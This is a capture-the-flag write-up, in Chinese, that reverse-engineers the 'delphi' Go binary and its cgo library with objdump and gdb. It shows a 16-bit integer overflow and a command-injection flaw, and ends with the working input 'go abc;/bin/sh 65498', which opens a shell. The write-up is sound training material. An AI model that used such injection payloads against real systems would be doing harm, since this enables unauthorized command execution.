# Delphi

> Challenge link: Nope
>
> Category: reverse

[delphi](https://github.com/ctfs/write-ups-2015/blob/master/bsides-vancouver-ctf-2015/ownable/delphi/delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b)

[libtwenty.so](https://github.com/ctfs/write-ups-2015/blob/master/bsides-vancouver-ctf-2015/ownable/delphi/libtwenty.so-4a3918b2efd9fbdfd20eeb8fa51ca76bc42eb2f2)

## Observation

因為有額外給的 Library ，所以要執行(分析)的時候要搭配 `LD_LIBRARY_PATH=.` 將當前資料夾指定給 Library 路徑

```bash
$ LD_LIBRARY_PATH=. ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
I'm thinking of something big, metal, and orange. Go!
> test
Who's that?
> deadbeef
Who's that?
>
```

### file

```bash
$ file ./delphi 
./delphi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=70886b932f383987896e371d422ab8a4089bd148, not stripped
```

### go binary

Objdump 後發現 `main.main` ，是 go 的 binary 檔，其中在 main package 中有兩個比較特別的 function

- main.doTheMagic
- main._Cfunc_check_answer (cgo 的 function)

``` bash
$ objdump -d delphi | grep '.*main.*>:'
0000000000400df0 <__libc_start_main@plt>:
0000000000401280 <main.main>:
0000000000401c30 <main.doTheMagic>:
0000000000401df0 <main.init>:
00000000004021c0 <main._Cfunc_CString>:
0000000000402230 <main._Cfunc_check_answer>:
0000000000402270 <main._Cfunc_free>:
0000000000411b20 <runtime.main>:
00000000004295b0 <main>:
```

## Solution

### Input

一開始先找看看輸入的地方

``` bash
$ go tool objdump delphi | grep '.*main\.go.*Scan'
        main.go:34      0x4016ee        bd30b74f00                      MOVL $bufio.ScanLines.f(SB), BP
        main.go:35      0x401755        e816b80200                      CALL bufio.(*Scanner).Scan(SB)
```

```bash
   0x401747 <main.main+1223>:   mov    QWORD PTR [rsp+0x48],rax
   0x40174c <main.main+1228>:   mov    rbx,QWORD PTR [rsp+0x48]
   0x401751 <main.main+1233>:   mov    QWORD PTR [rsp],rbx
=> 0x401755 <main.main+1237>:   call   0x42cf70 <bufio.(*Scanner).Scan>
   0x40175a <main.main+1242>:   movzx  rbx,BYTE PTR [rsp+0x8]
   0x401760 <main.main+1248>:   cmp    bl,0x0
   0x401763 <main.main+1251>:   je     0x4018b1 <main.main+1585>
   0x401769 <main.main+1257>:   mov    rdi,QWORD PTR [rsp+0x48]
Guessed arguments:
arg[0]: 0xc208028130 --> 0x0 
arg[1]: 0x7ffff7e20df0 --> 0xc208020000 --> 0x0 
```

輸入 deadbeef 後繼續觀察

發現後面出現一段有趣的比較，此時的 `rdx` 是輸入的長度，`rax` 是 'go' 的長度

由底下 `jl` 和 `jb` 可知 **輸入不能小於 2 **

```bash
RAX: 0x2 
RBX: 0x4d7f60 --> 0x4d7f70 --> 0x6f67 ('go')
RCX: 0x66656562 ('beef')
RDX: 0x8 
RSI: 0x4d7f70 --> 0x6f67 ('go')
RDI: 0xc208000260 ("deadbeef")
RBP: 0x7ffff7fb3000 --> 0x781d28 (0x00007ffff7fb3000)
RSP: 0x7ffff7e20dc0 --> 0xc208013000 ("deadbeef\n")
[-------------------------------------code-------------------------------------]
   0x401939 <main.main+1721>:   mov    rax,QWORD PTR [rbx+0x8]
   0x40193d <main.main+1725>:   mov    QWORD PTR [rsp+0x90],rdx
   0x401945 <main.main+1733>:   mov    QWORD PTR [rsp+0xb0],rax
=> 0x40194d <main.main+1741>:   cmp    rdx,rax
   0x401950 <main.main+1744>:   jl     0x401baa <main.main+2346>
   0x401956 <main.main+1750>:   cmp    rdx,rax
   0x401959 <main.main+1753>:   jb     0x401bb2 <main.main+2354>
   0x40195f <main.main+1759>:   mov    QWORD PTR [rsp+0xb8],rdi
```

再往下看，出現了 `runtime.eqstring` 

比較的目標是 輸入 ( 'deadbeef' ) 以及 'go' 的前兩個 byte (0x2)

```bash
   0x401986 <main.main+1798>:   mov    QWORD PTR [rsp+0x18],rax
=> 0x40198b <main.main+1803>:   call   0x425600 <runtime.eqstring>
   0x401990 <main.main+1808>:   movzx  rbx,BYTE PTR [rsp+0x20]
[------------------------------------stack-------------------------------------]
0000| 0x7ffff7e20dc0 --> 0xc208000260 ("deadbeef")
0008| 0x7ffff7e20dc8 --> 0x2 
0016| 0x7ffff7e20dd0 --> 0x4d7f70 --> 0x6f67 ('go')
0024| 0x7ffff7e20dd8 --> 0x2
```

實際測試一下，果然輸入開頭是 go 的話就會出現不一樣的結果

```bash
LD_LIBRARY_PATH=. ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
I'm thinking of something big, metal, and orange. Go!
> goabcd
Sneaky, sneaky. Go where? How fast?
> go
Sneaky, sneaky. Go where? How fast?
> abcd
Who's that?
> 
```

比對正確後就會進入 `main.doTheMagic` 了

```bash
   0x401a0d <main.main+1933>:   mov    QWORD PTR [rsp+0x8],rax
=> 0x401a12 <main.main+1938>:   call   0x401c30 <main.doTheMagic>
   0x401a17 <main.main+1943>:   lea    rbx,ds:0x4d4060
```

### doTheMagic

繼續往下看，發現 `strings.Split` ，以空格( ' ' )作為切割點

繼續執行後就結束了

```bash
   0x401c77 <main.doTheMagic+71>:       mov    rdi,rbp
   0x401c7a <main.doTheMagic+74>:       movs   QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
   0x401c7c <main.doTheMagic+76>:       movs   QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
=> 0x401c7e <main.doTheMagic+78>:       call   0x44a480 <strings.Split>
   0x401c83 <main.doTheMagic+83>:       mov    rdx,QWORD PTR [rsp+0x20]
   0x401c88 <main.doTheMagic+88>:       mov    rax,QWORD PTR [rsp+0x28]
   0x401c8d <main.doTheMagic+93>:       mov    rcx,QWORD PTR [rsp+0x30]
   0x401c92 <main.doTheMagic+98>:       mov    QWORD PTR [rsp+0x68],rdx
Guessed arguments:
arg[0]: 0x7ffff7e20d40 --> 0x8 
arg[1]: 0x4d37d0 --> 0x20 (' ')
```

另外在後面可以找到 `main._Cfunc_check_answer`

```bash
401dbf:       e8 6c 04 00 00          callq  402230 <main._Cfunc_check_answer>
```

我猜可能輸入要用空格分成好幾段，因此我在 `main._Cfunc_check_answer` 設斷點，並填入不同數目的輸入測試，最後發現需要輸入共三段就會經過斷點，輸入格式如下

```
go <something> <something>
```

### check_answer

往下看發現他利用 `cgocall` 呼叫了 `0x400f80`

```bash
=> 0x402249 <main._Cfunc_check_answer+25>:      mov    eax,0x400f80
   0x40224e <main._Cfunc_check_answer+30>:      mov    QWORD PTR [rsp],rax
   0x402252 <main._Cfunc_check_answer+34>:      lea    rax,[rsp+0x18]
   0x402257 <main._Cfunc_check_answer+39>:      mov    QWORD PTR [rsp+0x8],rax
   0x40225c <main._Cfunc_check_answer+44>:      call   0x404da0 <runtime.cgocall>
```

```bash
gdb-peda$ x/5gi 0x400f80
   0x400f80 <_cgo_de3376964270_Cfunc_check_answer>:     mov    rsi,QWORD PTR [rdi+0x8]
   0x400f84 <_cgo_de3376964270_Cfunc_check_answer+4>:   mov    edi,DWORD PTR [rdi]
   0x400f86 <_cgo_de3376964270_Cfunc_check_answer+6>:   jmp    0x400de0 <check_answer@plt>
   0x400f8b:    nop    DWORD PTR [rax+rax*1+0x0]
   0x400f90 <_cgo_de3376964270_Cfunc_free>:     mov    rdi,QWORD PTR [rdi]
```

要追進去的話，建議是在 `0x400f80` 設斷點，接著 continue 過去，避免中途沒跟到

最後會回到 check_answer

``` bash
=> 0x7ffff7bd5758 <check_answer>:       push   rbp
   0x7ffff7bd5759 <check_answer+1>:     mov    rbp,rsp
   0x7ffff7bd575c <check_answer+4>:     sub    rsp,0xa0
   0x7ffff7bd5763 <check_answer+11>:    mov    DWORD PTR [rbp-0x94],edi
   0x7ffff7bd5769 <check_answer+17>:    mov    QWORD PTR [rbp-0xa0],rsi
```

往下追會出現一個有趣的東西

此時的 `eax` 是最後一段輸入的值，因為我輸入的是 `go abc def` ，所以這邊的 eax 因爲轉不出來所以變成 0

add 後變成 42，由此可知 [rbp-0x2] 原始值應該是 42

```bash
   0x7ffff7bd5789 <check_answer+49>:    mov    eax,DWORD PTR [rbp-0x94]
=> 0x7ffff7bd578f <check_answer+55>:    add    WORD PTR [rbp-0x2],ax
   0x7ffff7bd5793 <check_answer+59>:    movzx  eax,WORD PTR [rbp-0x2]
   0x7ffff7bd5797 <check_answer+63>:    cmp    eax,0x4
   0x7ffff7bd579a <check_answer+66>:    ja     0x7ffff7bd57ed <check_answer+149>
```

如果比較符合後跳過去，會出現 `strcat` 以及 `system` 

在 stack 中可以看到 ’echo' 以及第二段輸入 'abc' ，看來是合成 'echo abc' 以後利用 system 執行

```bash
=> 0x7ffff7bd57d7 <check_answer+127>:   call   0x7ffff7bd5650 <strcat@plt>
   0x7ffff7bd57dc <check_answer+132>:   lea    rax,[rbp-0x90]
   0x7ffff7bd57e3 <check_answer+139>:   mov    rdi,rax
   0x7ffff7bd57e6 <check_answer+142>:   call   0x7ffff7bd5630 <system@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe4f0 --> 0x788170 --> 0x636261 ('abc')
0008| 0x7fffffffe4f8 --> 0x0 
0016| 0x7fffffffe500 --> 0x206f686365 ('echo ')
```

綜合上述，我們應該要使 42 + {number} >= 4

這裡有個有趣的地方，他在取值的時候是使用 WORD (2 bytes) 來取，當這裡的值超過 WORD 上限時就會歸零，我們可以利用這個點來達成上述的條件

```
number = 2^16 - 42 + eax
```

### command injection

前面有看到組合的 'echo abc' ，此時可以利用 `;` 來進行 command injection 來拿到 shell

```bash
$ LD_LIBRARY_PATH=. ./delphi 
Welcome!

Are you ready to play 20 questions? No? Perfect!
I'm thinking of something big, metal, and orange. Go!
> go abc;/bin/sh 65498				# 2^16 - 42 + 4 (eax = 4)
abc
$ ls
delphi  libtwenty.so  peda-session-delphi.txt
$ 
```